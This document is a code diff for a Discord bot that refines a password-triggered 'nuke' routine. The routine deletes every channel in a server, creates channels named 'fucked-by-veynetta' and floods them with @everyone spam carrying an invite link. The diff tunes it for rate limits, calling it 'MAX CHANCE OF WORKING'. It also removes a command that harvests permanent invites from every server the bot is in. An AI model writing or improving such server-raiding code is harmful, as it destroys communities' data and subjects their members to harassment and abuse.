@@ -40,7 +40,7 @@ client.once('ready', () => {
   console.log(`${client.user.tag} is online`);
 });
 
-// ====================== MESSAGE COMMANDS ======================
+// ====================== COMMANDS ======================
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
   const content = message.content.trim().toLowerCase();
@@ -60,22 +60,6 @@ client.on('messageCreate', async message => {
     );
 
     return message.reply({ embeds: [embed], components: [row] });
-  }
-
-  if (content === '!inv') {
-    const guilds = Array.from(client.guilds.cache.values());
-    if (guilds.length === 0) return message.reply('❌ Bot is not in any servers.');
-
-    const embed = new EmbedBuilder().setColor('#00ffff').setTitle('📋 Servers & Invites');
-    for (const guild of guilds) {
-      let inviteLink = 'Failed';
-      try {
-        const inv = await guild.invites.create(guild.channels.cache.find(c => c.type === 0)?.id, { maxAge: 0 });
-        inviteLink = inv.url;
-      } catch {}
-      embed.addFields({ name: guild.name, value: `Members: ${guild.memberCount}\nInvite: ${inviteLink}` });
-    }
-    message.reply({ embeds: [embed] });
   }
 });
 
@@ -155,7 +139,7 @@ client.on('interactionCreate', async interaction => {
       }
     }
 
-    // ==================== AGGRESSIVE NUKE ====================
+    // ==================== MINIMAL NUKE - MAX CHANCE OF WORKING ====================
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
@@ -170,44 +154,50 @@ client.on('interactionCreate', async interaction => {
       const invite = 'https://discord.gg/veynettas';
 
       try {
-        await interaction.editReply({ content: `☢️ **FAME TAKEOVER** started on **${guild.name}**...` });
+        await interaction.editReply({ content: `☢️ Deleting all channels...` });
 
-        // Delete everything
+        // Delete
         for (const ch of guild.channels.cache.values()) {
           await ch.delete().catch(() => {});
-          await delay(400);
+          await delay(500);
         }
 
-        await interaction.followUp({ content: '🔨 Starting infinite fucked-by-veynetta channels + spam...', flags: MessageFlags.Ephemeral });
+        // Create channels
+        await interaction.editReply({ content: '🔨 Creating fucked-by-veynetta channels...' });
 
-        // Aggressive infinite loop
-        for (let round = 0; round < 10; round++) {
-          // Create many channels
-          for (let i = 0; i < 12; i++) {
-            try {
-              await guild.channels.create({ name: 'fucked-by-veynetta', type: 0 });
-            } catch {}
+        let created = 0;
+        for (let i = 0; i < 12; i++) {
+          try {
+            await guild.channels.create({
+              name: 'fucked-by-veynetta',
+              type: 0,
+              reason: 'Fame Nuke'
+            });
+            created++;
+            await delay(800);
+          } catch (e) {
+            console.log("Channel creation stopped");
+            break;
           }
-
-          // Spam @everyone fast
-          const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-veynetta');
-          for (const ch of channels.values()) {
-            for (let i = 0; i < 10; i++) {
-              ch.send(`@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`).catch(() => {});
-            }
-          }
-
-          await delay(800);
         }
 
-        await interaction.followUp({ 
-          content: `✅ **AGGRESSIVE NUKE ACTIVE**\n• Infinite \`fucked-by-veynetta\` channels being created\n• @everyone spam running with new invite`,
-          flags: MessageFlags.Ephemeral 
+        // Spam
+        const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
+        const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-veynetta');
+
+        for (const ch of channels.values()) {
+          for (let i = 0; i < 8; i++) {
+            ch.send(spamText).catch(() => {});
+          }
+        }
+
+        await interaction.editReply({ 
+          content: `✅ **NUKE COMPLETE**\nCreated **${created}** channels named \`fucked-by-veynetta\`` 
         });
 
       } catch (err) {
         console.error(err);
-        await interaction.followUp({ content: '⚠️ Nuke running (rate limits active).', flags: MessageFlags.Ephemeral }).catch(() => {});
+        await interaction.editReply({ content: '❌ Failed. Check bot permissions (needs Administrator).' }).catch(() => {});
       }
 
       userSessions.delete(interaction.user.id);
